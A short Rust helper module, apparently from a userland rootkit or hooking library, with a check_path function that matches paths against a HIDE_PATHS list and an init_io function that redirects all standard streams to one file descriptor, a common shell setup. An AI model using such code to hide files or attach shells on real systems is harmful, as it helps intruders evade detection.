use std::os::raw::c_void;
use std::ffi::{CStr, CString};
use std::path::{Path,PathBuf};
use crate::HIDE_PATHS;
use nix::unistd::dup2;

pub fn from_c_str(buf: *mut c_void) -> String {
    unsafe {CStr::from_ptr(buf as *const _)}.to_string_lossy().into_owned()
}

pub fn init_io(fd: i32) {
    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);
}

pub fn c_str(buf: &str) -> CString {
    CString::new(buf).unwrap()
}

pub fn split_string<'a>(s: &'a str, split: &str, offset: usize) -> &'a str {
    s.split(split).collect::<Vec<&str>>()[offset]
}

pub fn check_path(pathname: *mut c_void) -> bool {
    let path = from_c_str(pathname);
    let path = Path::new(&path);
    let resolved = path.canonicalize();
    if resolved.is_ok() {
        let resolved = resolved.unwrap();
        return HIDE_PATHS.contains(&*resolved.to_string_lossy());
    }
    false
}